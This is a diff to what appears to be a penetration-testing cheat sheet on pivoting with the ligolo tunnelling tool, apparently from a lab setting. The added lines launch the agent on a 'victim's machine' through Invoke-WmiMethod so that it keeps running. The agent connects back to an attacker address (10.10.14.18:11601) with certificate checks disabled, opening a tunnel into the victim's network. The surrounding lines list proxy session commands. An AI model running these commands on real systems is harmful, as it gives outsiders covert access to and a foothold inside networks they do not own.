@@ -1196,6 +1196,10 @@ sudo ip link set ligolo up
 # Run the Agent on the victim's machine (Pivot Host).
 agent.exe -connect 10.10.14.18:11601 -ignore-cert
 
+# Run the Agent on the victim's machine alway running 
+$cmd = 'C:\Users\Administrator\Documents\agent.exe -connect 10.10.14.18:11601 -ignore-cert'
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $cmd
+
 # Activate Tunnel on the Proxy interface.  ( run in proxy)
 session       (Display a list of all connected agents.)
 ifconfig      (Check the victim's network cards and IP addresses)
